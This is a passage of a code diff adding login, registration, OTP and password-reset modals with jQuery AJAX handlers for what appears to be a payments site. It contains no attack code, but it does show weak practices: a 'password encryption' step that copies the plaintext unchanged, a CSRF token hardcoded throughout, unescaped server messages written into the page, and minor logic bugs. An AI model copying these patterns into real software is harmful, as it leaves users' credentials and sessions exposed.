+                    onkeyup="return submitbtnforgot()" placeholder="Confirm New Password" name="confirmpwdforgot" >
+                  <div class="input-group-prepend">
+                    <div class="input-group-text"   style="height: 50px; margin-left: -8px;"><i class="fas fa-eye-slash toggle-password-confirmforgotpwd"></i>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <p class="termsline text-danger" >*Do not share your password and OTP with anyone.</p>
+              <div class="form-group">
+                <button type="submit" id="forgotsubmitbtn" class="custmbtn btn btn-primary btn-block"
+                  disabled>Submit</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Validate Password modal form end here -->
+
+<!-- OTP verification modal (wallet) form start here -->
+
+
+<div class="modal fade" id="otpverifywallet" tabindex="-1" role="dialog" aria-labelledby="otpverifywallet"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="WotpverificationTitle">OTP Verification</h5>
+       
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button>
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='Wotpverifyform'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div class="form-group">
+                <div id="Wotpmessage"></div>
+                <input type="hidden" id="Wmobile" name="Wmobile" value="">
+                <input type="hidden" id="Wemail" name="Wemail" value="">
+                <input type="hidden" id="WencryptPwd" name="WencryptPwd" value="">
+                <input type="hidden" id="Wfirst_name" name="Wfirst_name" value="">
+                <input type="hidden" id="Wmiddle_name" name="Wmiddle_name" value="">
+                <input type="hidden" id="Wlast_name" name="Wlast_name" value="">
+                <input type="hidden" id="Wgender" name="Wgender" value="">
+                <input type="hidden" id="Wsms_notifications" name="Wsms_notifications" value="">
+                <input type="hidden" id="Wautoassigncard" name="Wautoassigncard" value="">
+                <input type="hidden" id="Widentity_type" name="Widentity_type" value="">
+                <input type="hidden" id="Widentity_number" name="Widentity_number" value="">
+                <input type="hidden" id="Wemailotp" name="Wemailotp" value="wallet">
+
+                <input type="text" class="form-control" id="Wmobileforotp" name="Wmobileforotp" disabled>
+              </div>
+              <div class="form-group">
+                <div class="input-group mb-2">
+                <input type="password" class="form-control togglewallet" id="Wmobileotp" placeholder="Enter Mobile OTP"
+                  name="Wmobileotp" maxlength="6" minlength="6" onkeypress='return restrictAlphabets(event)'>
+                  <div class="input-group-prepend">
+                    <div class="input-group-text"><i class="fas fa-eye-slash toggle-password-Walletmobileotp"></i>
+                    </div>
+                  </div>
+                  </div>
+              </div>
+       
+          <div class="form-group">
+
+            <p class="text-right mb-2"><a id="walletmobotp" class="resendotpc" onclick="walletuser_resendotp()">Resend OTP</a></p>
+            <p id="displaysignupwallet"></p>
+          
+        </div>
+      
+              <div class="form-group">
+                <button type="submit" id="Wotpverifybtn" class="custmbtn btn btn-primary btn-block">Verify</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- OTP verification modal form (wallet) end here -->
+
+<!-- OTP verification modal B2c to Wallet user start -->
+
+
+<div class="modal fade" id="verify_b2c_wallet" tabindex="-1" role="dialog" aria-labelledby="verify_b2c_wallet"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center">OTP Verification</h5>
+       
+       <!-- <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button> -->
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='verify_b2c_to_wallet'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div class="form-group">
+                <div id="Verifyotpmessage"></div>
+                
+
+                <input type="text" class="form-control" id="Wmobileforotp_verify" name="Wmobileforotp_verify" required disabled>
+              </div>
+              <div class="form-group">
+                <div class="input-group mb-2">
+                <input type="password" class="form-control togglewallet" id="Wmobileotp_verify" placeholder="Enter Mobile OTP"
+                  name="Wmobileotp_verify" maxlength="6" minlength="6" onkeypress='return restrictAlphabets(event)' required>
+                  <div class="input-group-prepend">
+                    <div class="input-group-text"><i class="fas fa-eye-slash toggle-password-Walletmobileotp"></i>
+                    </div>
+                  </div>
+                  </div>
+              </div>
+       
+          <!-- <div class="form-group">
+
+            <p class="text-right mb-2"><a id="walletmobotp_verify" class="resendotpc" onclick="walletuser_resendotp()">Resend OTP</a></p>
+            <p id="displaysignupwallet"></p>
+          
+        </div> -->
+      
+              <div class="form-group">
+                <button type="submit" id="Verifyb2cotpbtn" class="custmbtn btn btn-primary btn-block">Verify</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- OTP verification modal B2c to Wallet user end here -->
+
+<div class="modal fade" id="login_otp_verify" tabindex="-1" role="dialog" aria-labelledby="login_otp_verify"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center">OTP Verification</h5>
+     <!--  
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button> -->
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='login_otp_form'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div class="form-group mb-3">
+                <div id="loginotpmessage"></div>
+                
+
+                <input type="text" class="form-control" id="login_user_mob" name="login_user_mob" required disabled>
+              </div>
+              <div class="form-group mb-3">
+                <div class="input-group mb-2">
+                <input type="password" class="form-control togglewallet" id="login_otp" name = 'login_otp' placeholder="Enter Mobile OTP"
+                  name="Wmobileotp_verify" maxlength="6" minlength="6" onkeypress='return restrictAlphabets(event)' required>
+                  <div class="input-group-prepend">
+                    <div class="input-group-text" style="height:50px; margin-left:-8px;"><i class="fas fa-eye-slash toggle-password-Walletmobileotp"></i>
+                    </div>
+                  </div>
+                  </div>
+                  <p class="termsline text-danger" >*Do not share your OTP with anyone.</p>
+              </div>
+       
+          <!-- <div class="form-group">
+
+            <p class="text-right mb-2"><a id="walletmobotp_verify" class="resendotpc" onclick="walletuser_resendotp()">Resend OTP</a></p>
+            <p id="displaysignupwallet"></p>
+          
+        </div> -->
+      
+              <div class="form-group">
+                <p id="resendbtn"></p>
+                <button type="submit" id="Verifyloginotpbtn" class="custmbtn btn btn-primary btn-block">Verify</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Verify OVD popup -->
+<div class="modal fade" data-backdrop="static" data-keyboard="false" id="ovdpopup" tabindex="-1" role="dialog" aria-labelledby="ovdpopupLabel" aria-hidden="true">
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      
+      <div class="modal-header">
+        
+        <h5 class="modal-title text-center">Information</h5>
+        
+      </div>
+      <div class="modal-body">
+         <p class="text-center" style="line-height: normal;">You have not verified your OVD(Official Valid Document). Providing a valid OVD is recommended to avail additional facilities and features.</p>
+         
+         <div class="w-100 text-center">
+          <!-- <button type="button" id="inactive_send_otp_btn" class="btn btn-primary">Send OTP</button> -->
+          <button type="button" id="ovdpopup_close" class="btn btn-primary" onclick="$('#ovd_popup_shown').val('true');$('#ovdpopup').modal('hide');">OK</button>
+         </div>
+      </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  $(document).ready(function (){
+    var dtToday = new Date();
+    
+    var month = dtToday.getMonth() + 1;
+    var day = dtToday.getDate();
+    var year = dtToday.getFullYear();
+    year = year - 18
+    if(month < 10)
+        month = '0' + month.toString();
+    if(day < 10)
+        day = '0' + day.toString();
+    
+    var maxDate = year + '-' + month + '-' + day;
+    $('#signup_dob').attr('max', maxDate);
+  });
+
+  
+  $(".toggle-password-login").click(function () {
+
+    $(this).toggleClass("fa-eye-slash fa-eye");
+    var input = $(".togglelogin");
+    if (input.attr("type") === "password") {
+      input.attr("type", "text");
+    } else {
+      input.attr("type", "password");
+    }
+  });
+   $(".toggle-password-regpwd").click(function () {
+
+    $(this).toggleClass("fa-eye-slash fa-eye");
+    var input = $(".toggleregpwd");
+    if (input.attr("type") === "password") {
+      input.attr("type", "text");
+    } else {
+      input.attr("type", "password");
+    }
+  });
+
+  $(".toggle-password-confreg").click(function () {
+
+    $(this).toggleClass("fa-eye-slash fa-eye");
+    var input = $(".toggleconfregpwd");
+    if (input.attr("type") === "password") {
+      input.attr("type", "text");
+    } else {
+      input.attr("type", "password");
+    }
+  });
+</script>
+
+<script>
+
+  $('#btnSignup').on('click', function (event) {
+    var str = $('#reg_pwd').val();
+    var encrStr = str;
+    $('#encryptPwd').val(encrStr);
+
+  });
+
+  $('#loginbtn').on('click', function (event) {
+    var loginstr = $('#loginPwd').val();
+    var encrloginStr = loginstr;
+    $('#encryptloginPwd').val(encrloginStr);
+    
+  }
+  );
+
+
+  // Ajax Login Form Submission
+  $('#loginform').on('submit', function (event) {
+    $('#Wmobileforotp_verify').val($('#username').val());
+    $('#login_user_mob').val($('#username').val());
+    $('#loginbtn').prop("disabled", true);
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    event.preventDefault();
+    $('#message').html('');
+    $('#loginbtn').html("LOADING <i class='fa fa-refresh fa-spin'></i>");
+    
+    $.ajax({
+      url: "/log-success",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+      
+        if (data.status_code == 'S') {
+          if($('#logincalledfrom').val() == 'BuyFastag' ){
+            window.location.href = "/ebixcash-consumer/fastag/";
+          }
+          else if($('#logincalledfrom').val() == 'BillPayment' ){
+            window.location.href = "/ebixcash-consumer/billpayment/";
+          }
+          
+          else if($('#logincalledfrom').val() == 'MoneyTransfer' ){
+            window.location.href = "/Money-Transfer/";
+          }
+          else if($('#logincalledfrom').val() == 'Ebixcash Consumer' ){
+            window.location.href = "/ebixcash-consumer/";
+          }
+          else if($('#logincalledfrom').val() == 'moneytransferhome' ){
+            window.location.href = "/ebixcash-consumer/money-transfer/";
+          }
+          else if($('#logincalledfrom').val() == 'billpaymenthome' ){
+            window.location.href = "/ebixcash-consumer/billpayment/";
+          }
+          else{
+            window.location.href = "/";
+          }
+        }
+        else if(data.status_code == 'O'){
+          $("#login_captcha_img").attr('src',"data:image/png;base64,"+data.imgData);
+          $('#loginbtn').removeAttr("disabled");
+          $('#loginbtn').html("LOGIN");
+          $('#login').modal('hide');
+          $('#login_otp_verify').modal('show')
+          timerFunction()
+        }
+
+        else if(data.status_code == 'V'){
+          $("#login_captcha_img").attr('src',"data:image/png;base64,"+data.imgData);
+          $('#loginbtn').removeAttr("disabled");
+          $('#loginbtn').html("LOGIN");
+          $('#login').modal('hide');
+          $('#verify_b2c_wallet').modal('show')
+        }
+        
+        else {
+		      $("#login_captcha_img").attr('src',"data:image/png;base64,"+data.imgData);
+          $('#loginbtn').removeAttr("disabled");
+          $('#loginbtn').html("LOGIN");
+          $('#message').html('<div class="alert alert-danger alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+        }
+      }
+    });
+  });
+
+  // ajax verify b2c to wallet form submission
+  $('#verify_b2c_to_wallet').on('submit', function (event){
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    event.preventDefault();
+    $('#Verifyb2cotpbtn').attr('disabled',true);
+    
+    $.ajax({
+      url: "/ajax/verify-b2c-wallet",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+              Wmobileforotp_verify: $('#Wmobileforotp_verify').val(),
+              Wmobileotp_verify:$('#Wmobileotp_verify').val(),
+            },
+      success: function (data) {
+        if (data.status_code == 'S'){
+          $('#message').html('<div class="alert alert-success alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+          $('#verify_b2c_wallet').modal('hide');
+          $('#Verifyb2cotpbtn').attr('disabled',false);
+          $('#login').modal('show');
+        }
+        else{
+          $('#Verifyb2cotpbtn').attr('disabled',false);
+          $('#Verifyotpmessage').html('<div class="alert alert-danger alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+          
+        }
+
+      }
+      });
+  })
+
+
+  $('#login_otp_form').on('submit', function (event){
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    event.preventDefault();
+    $('#Verifyloginotpbtn').attr('disabled',true);
+    
+    $.ajax({
+      url: "/ajax/verify-login-otp",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+              login_user_mob: $('#login_user_mob').val(),
+              login_otp:$('#login_otp').val(),
+            },
+      success: function (data) {
+        if (data.status_code == 'S'){
+          if($('#logincalledfrom').val() == 'BuyFastag' ){
+            window.location.href = "/ebixcash-consumer/fastag/";
+          }
+          else if($('#logincalledfrom').val() == 'BillPayment' ){
+            window.location.href = "/ebixcash-consumer/billpayment/";
+          }
+          
+          else if($('#logincalledfrom').val() == 'MoneyTransfer' ){
+            window.location.href = "/Money-Transfer/";
+          }
+          else if($('#logincalledfrom').val() == 'Ebixcash Consumer' ){
+            window.location.href = "/ebixcash-consumer/";
+          }
+          else if($('#logincalledfrom').val() == 'moneytransferhome' ){
+            window.location.href = "/ebixcash-consumer/money-transfer/";
+          }
+          else if($('#logincalledfrom').val() == 'billpaymenthome' ){
+            window.location.href = "/ebixcash-consumer/billpayment/";
+          }
+          else{
+            window.location.href = "/";
+          }
+          
+        }
+        else{
+          $('#Verifyloginotpbtn').attr('disabled',false);
+          $('#loginotpmessage').html('<div class="alert alert-danger alert-dismissible fade show" role="alert"><center>' + 'Invalid otp provided' + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+          
+        }
+
+      }
+      });
+  })
+
+
+
+  // Ajax Register Form Submission
+  $('#registerform').on('submit', function (event) {
+    event.preventDefault();
+    var mydata = true
+        if($('#verify_id_text').text() == 'Verify'){
+            if($('#ovd_popup_shown').val() == 'false'){
+              mydata =false
+              $('#ovdpopup').modal('show')
+            }
+            else{
+              mydata =true
+            }
+            
+          
+          
+        }
+        else if($('#verify_id_text').text() == '✅ Verified'){
+            var id_name=$('#verified_name').val()
+            var name = $('#first_name').val().toLowerCase() + $('#middle_name').val().toLowerCase() + $('#last_name').val().toLowerCase()
+            name=name.replaceAll(/\s/g,'')
+            if(id_name != name){
+              $('#registermessageF').html('Please enter name as per verified ID Proof.');
+              document.getElementById('registermessageF').scrollIntoView(true);
+              mydata=false
+            }
+            else if($('#verified_idtype').val() != $('#identity_type').val() || $('#verified_idnumber').val() != $('#identity_number').val()){
+              $('#verify_id_text').text('Verify')
+              $('#is_verified').val('false')
+              $('#verify_id_text').removeClass('text-success')
+              $('#registermessageF').html('Please verify your OVD document details again.');
+              document.getElementById('registermessageF').scrollIntoView(true);
+              mydata=false
+            }
+            
+            
+        }
+
+        if(mydata == true){
+          $('#btnSignup').prop("disabled", true);
+          var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+          event.preventDefault();
+          $('#registermessageS').html('');
+          $('#registermessageF').html('');
+          $('#btnSignup').html("LOADING <i class='fa fa-refresh fa-spin'></i>");
+          $.ajax({
+            url: "/ajax/reg-success",
+            headers: { "X-CSRFToken": token },
+            method: 'POST',
+            data: $(this).serialize(),
+            success: function (data) {
+              if (data.status_code == 'S') {
+                $('#Omobile').val($('#mobile_number').val());
+                $('#Oemail').val($('#email_id').val());
+                $('#mobileforotp').val($('#mobile_number').val());
+                $('#OencryptPwd').val($('#encryptPwd').val());
+                $('#Ofirst_name').val($('#first_name').val());
+                $('#Omiddle_name').val($('#middle_name').val());
+                $('#Olast_name').val($('#last_name').val());
+                $('#Ogender').val($('#gender').val());
+                $('#Osms_notifications').val($('#sms_notifications').val());
+                $('#Oautoassigncard').val($('#virtual_asc_card').val());
+                $('#Oidentity_type').val('');
+                $('#Oidentity_number').val('');
+                $('#emailforotp').val($('#email_id').val());
+
+                $('#Wmobile').val($('#mobile_number').val());
+                $('#Wemail').val($('#email_id').val());
+                $('#Wmobileforotp').val($('#mobile_number').val());
+                $('#WencryptPwd').val($('#encryptPwd').val());
+                $('#Wfirst_name').val($('#first_name').val());
+                $('#Wmiddle_name').val($('#middle_name').val());
+                $('#Wlast_name').val($('#last_name').val());
+                $('#Wgender').val($('#gender').val());
+                $('#Wsms_notifications').val($('#sms_notifications').val());
+                $('#Wautoassigncard').val($('#virtual_asc_card').val());
+                $('#Widentity_type').val($('#identity_type').val());
+                $('#Widentity_number').val($('#identity_number').val());
+                $("#captchaimgsignup img").attr('src',"data:image/png;base64,"+data.imgData);
+                $("#signup").modal('hide');
+                if (data.status_type == 'b2cregister') {
+                  $('#otpmessage').html(data.status_desc);
+                  $("#otpverify").modal('show');
+                }
+                else {
+                  $('#Wemailotp').val('wallet');
+                  $('#Wotpmessage').html(data.status_desc);
+                  $("#otpverifywallet").modal('show');
+                }
+
+              }
+              else {
+                $("#captchaimgsignup img").attr('src',"data:image/png;base64,"+data.imgData);
+                document.getElementById('signupTitle').scrollIntoView(true);
+                $('#registermessageF').html('<div class="alert alert-danger alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+                document.getElementById('registermessageF').scrollIntoView(true);
+                $('#btnSignup').removeAttr("disabled");
+                $('#btnSignup').html("SIGN UP");
+                if(data.status_desc == 'Please enter name as per verified ID Proof.' || data.status_desc == 'Please verify your OVD document details again.'){
+                  $('#verify_id_text').text('Verify');
+                  $('#is_verified').val('false')
+                }
+              }
+            },
+          });
+        }
+
+
+
+
+
+
+
+
+
+
+
+
+    // $('#btnSignup').prop("disabled", true);
+    // var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    // event.preventDefault();
+    // $('#registermessageS').html('');
+    // $('#registermessageF').html('');
+    // $('#btnSignup').html("LOADING <i class='fa fa-refresh fa-spin'></i>");
+    // $.ajax({
+    //   url: "/ajax/reg-success",
+    //   headers: { "X-CSRFToken": token },
+    //   method: 'POST',
+    //   data: $(this).serialize(),
+    //   success: function (data) {
+    //     if (data.status_code == 'S') {
+    //       $('#Omobile').val($('#mobile_number').val());
+    //       $('#Oemail').val($('#email_id').val());
+    //       $('#mobileforotp').val($('#mobile_number').val());
+    //       $('#OencryptPwd').val($('#encryptPwd').val());
+    //       $('#Ofirst_name').val($('#first_name').val());
+    //       $('#Olast_name').val($('#last_name').val());
+    //       $('#Ogender').val($('#gender').val());
+    //       $('#Osms_notifications').val($('#sms_notifications').val());
+    //       $('#Oautoassigncard').val($('#virtual_asc_card').val());
+    //       $('#Oidentity_type').val($('#identity_type').val());
+    //       $('#Oidentity_number').val($('#identity_number').val());
+    //       $('#emailforotp').val($('#email_id').val());
+
+    //       $('#Wmobile').val($('#mobile_number').val());
+    //       $('#Wemail').val($('#email_id').val());
+    //       $('#Wmobileforotp').val($('#mobile_number').val());
+    //       $('#WencryptPwd').val($('#encryptPwd').val());
+    //       $('#Wfirst_name').val($('#first_name').val());
+    //       $('#Wlast_name').val($('#last_name').val());
+    //       $('#Wgender').val($('#gender').val());
+    //       $('#Wsms_notifications').val($('#sms_notifications').val());
+    //       $('#Wautoassigncard').val($('#virtual_asc_card').val());
+    //       $('#Widentity_type').val($('#identity_type').val());
+    //       $('#Widentity_number').val($('#identity_number').val());
+    //       $("#captchaimgsignup img").attr('src',"data:image/png;base64,"+data.imgData);
+    //       $("#signup").modal('hide');
+    //       if (data.status_type == 'b2cregister') {
+    //         $('#otpmessage').html(data.status_desc);
+    //         $("#otpverify").modal('show');
+    //       }
+    //       else {
+    //         $('#Wemailotp').val('wallet');
+    //         $('#Wotpmessage').html(data.status_desc);
+    //         $("#otpverifywallet").modal('show');
+    //       }
+
+    //     }
+    //     else {
+    //       $("#captchaimgsignup img").attr('src',"data:image/png;base64,"+data.imgData);
+    //       document.getElementById('signupTitle').scrollIntoView(true);
+    //       $('#registermessageF').html('<div class="alert alert-danger alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+    //       document.getElementById('registermessageF').scrollIntoView(true);
+    //       $('#btnSignup').removeAttr("disabled");
+    //       $('#btnSignup').html("SIGN UP");
+    //     }
+    //   },
+    // });
+  });
+
+
+  $('#Wotpverifyform').on('submit', function (event) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    event.preventDefault();
+    $('#Wotpmessage').html('');
+    $('#successmessage').html('');
+    $.ajax({
+      url: "/ajax/verify-otp-wallet",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+        if (data.status_code == 'S') {
+          $("#otpverifywallet").modal('hide');
+          $("#login").modal('show');
+          $('#successmessage').html('<div class="alert alert-success alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+        }
+        else {
+          $('#Wotpmessage').html(data.status_desc);
+        }
+      }
+    });
+  }
+  );
+
+  $('#otpverifyform').on('submit', function (event) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    event.preventDefault();
+    $('#otpmessage').html('');
+    $('#successmessage').html('');
+    
+    $.ajax({
+      url: "/ajax/verify-otp",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+        if (data.status_code == 'S') {
+          $("#otpverify").modal('hide');
+          $("#login").modal('show');
+          $('#successmessage').html('<div class="alert alert-success alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+        }
+        else {
+          $('#otpmessage').html(data.status_desc);
+        }
+      }
+    });
+  }
+  
+  );
+
+
+
+
+
+  $('#forgotpwdform').on('submit', function (event) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $('#forgotpwdmessage').html('');
+    event.preventDefault();
+    $.ajax({
+      url: "/ajax/forgot-pwd",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+        if (data.status_code == 'S') {
+          $('#resetCheckUser').val(data.user_type);
+          $('#validatemobileforgot').val($('#mobileforgot').val());
+          $('#viewmobile').val($('#mobileforgot').val());
+          $("#forgotpwd").modal('hide');
+          if (data.user_type == 'B2C') {
+            $("#validateforgotpwd").modal('show');
+          }
+          else {
+            $("#validateforgotpwd").modal('show');
+          }
+
+
+        }
+        else {
+          $('#forgotpwdmessage').html(data.status_desc);
+        }
+      }
+    });
+  }
+  );
+$(".toggle-password-otp").click(function () {
+
+$(this).toggleClass("fa-eye-slash fa-eye");
+var input = $(".toggleotp");
+if (input.attr("type") === "password") {
+  input.attr("type", "text");
+} else {
+  input.attr("type", "password");
+}
+});
+
+  $(".toggle-password-newforgotpwd").click(function () {
+
+    $(this).toggleClass("fa-eye-slash fa-eye");
+    var input = $(".toggleforgotpwd");
+    if (input.attr("type") === "password") {
+      input.attr("type", "text");
+    } else {
+      input.attr("type", "password");
+    }
+  });
+
+  $(".toggle-password-confirmforgotpwd").click(function () {
+
+    $(this).toggleClass("fa-eye-slash fa-eye");
+    var input = $(".toggleconfirmforgotpwd");
+    if (input.attr("type") === "password") {
+      input.attr("type", "text");
+    } else {
+      input.attr("type", "password");
+    }
+  });
+
+
+
+  $('#validateforgotpwdform').on('submit', function (event) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $('#verifyforgotpwdmessage').html('');
+    event.preventDefault();
+    $.ajax({
+      url: "/ajax/verify-forgot-pwd",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+        if (data.status_code == 'S') {
+          $("#validateforgotpwd").modal('hide');
+          $("#login").modal('show');
+          $('#successmessage').html('<div class="alert alert-success alert-dismissible fade show" role="alert"><center>' + data.status_desc + '</center><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
+        }
+        else {
+          $('#verifyforgotpwdmessage').html(data.status_desc);
+        }
+      }
+    });
+  }
+  );
+
+      
+
+  // To reset the modal form if user reopens the modal form
+  $('.modal').on('hidden.bs.modal', function (e) {
+    $(this).find('form').trigger('reset');
+    $('#registermessageS').html('');
+    $('#registermessageF').html('');
+    $('#message').html('');
+    $('#successmessage').html('');
+    $('#otpmessage').html('');
+
+    $('#Wotpmessage').html('OTP has been sent to the entered number');
+    $('#verifywalletupgrademessage').html('OTP has been sent to the entered number');
+    $('#forgotpwdmessage').html('');
+  });
+
+  $('input').attr("autocomplete", "off");
+
+  $(".modal").on('shown.bs.modal', function () {
+    $(this).find("input:visible:first").focus();
+});
+
+
+
+  // Check password with confirm password
+  var check = function () {
+    reg = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!#%*?&]{8,}$/i;
+
+    if (document.getElementById('reg_pwd').value ==
+      document.getElementById('confirmpassword').value &&
+      document.getElementById('reg_pwd').value.match(reg) !=null) {
+      document.getElementById("confirmpassword").style.border = "1px solid green";
+      document.getElementById("confirmeye").style.border = "1px solid green";
+      document.getElementById("reg_pwd").style.border = "1px solid green";
+      document.getElementById("passeye").style.border = "1px solid green";
+      document.getElementById("btnSignup").disabled = false;
+    }
+    
+    else if(document.getElementById('reg_pwd').value !=
+      document.getElementById('confirmpassword').value ||
+      document.getElementById('reg_pwd').value.match(reg) ==null) {
+      document.getElementById("reg_pwd").style.border = "1px solid red";
+      document.getElementById("passeye").style.border = "1px solid red";
+      document.getElementById("confirmpassword").style.border = "1px solid red";
+      document.getElementById("confirmeye").style.border = "1px solid red";
+      document.getElementById("btnSignup").disabled== true;
+
+    }
+  }
+
+  function restrictAlphabets(e) {
+    var x = e.which || e.keycode;
+    if ((x >= 48 && x <= 57) || x == 8 ||
+      (x >= 35 && x <= 40) || x == 46 )
+      return true;
+    else
+      return false;
+  }
+
+  
+
+  function changecolormobile() {
+
+    if (document.getElementById('mobile_number').value.length < 10) {
+      document.getElementById('mobile_number').style.border = "1px solid red";
+    }
+    else {
+      document.getElementById('mobile_number').style.border = "1px solid #ced4da";
+    }
+  }
+
+  
+  function idproof() {
+    if (document.getElementById('identity_type').value == "") {
+
+      document.getElementById('identity_number').style.display = 'none';
+      document.getElementById('identity_number').required = false;
+    }
+    else {
+      document.getElementById('identity_number').style.display = '';
+      document.getElementById('identity_number').required = true;
+
+
+    }
+  }
+  function submitbtnforgot() {
+    if (document.getElementById('passwordforgot').value == document.getElementById('confirmpwdforgot').value) {
+      document.getElementById('forgotsubmitbtn').disabled = false;
+    }
+    else {
+      document.getElementById('forgotsubmitbtn').disabled = true;
+    }
+  }
+
+  function forgotmobsubmitbtn() {
+    if (document.getElementById('mobileforgot').value == ' ') {
+      document.getElementById('forgotsubmmitbtn').disabled = true;
+    }
+    else {
+      document.getElementById('forgotsubmmitbtn').disabled = false;
+    }
+  }
+  
+
+</script>
+
+<script>
+$(".toggle-password-emailotp ").click(function () {
+
+$(this).toggleClass("fa-eye-slash fa-eye");
+var input = $(".toggleemail");
+if (input.attr("type") === "password") {
+  input.attr("type", "text");
+} else {
+  input.attr("type", "password");
+}
+});
+
+
+$(".toggle-password-Walletmobileotp ").click(function () {
+$(this).toggleClass("fa-eye-slash fa-eye");
+var input = $(".togglewallet");
+if (input.attr("type") === "password") {
+  input.attr("type", "text");
+} else {
+  input.attr("type", "password");
+}
+});
+
+$(".toggle-pasword-mobileotp").click(function () {
+
+$(this).toggleClass("fa-eye-slash fa-eye");
+var input = $(".togglemobile");
+if (input.attr("type") === "password") {
+  input.attr("type", "text");
+} else {
+  input.attr("type", "password");
+}
+});
+</script>
+
+<script>
+  
+  $("#walletmobotp").click(function(){
+              event.preventDefault();
+              document.getElementById("Wotpmessage").innerHTML = "Resending OTP...";
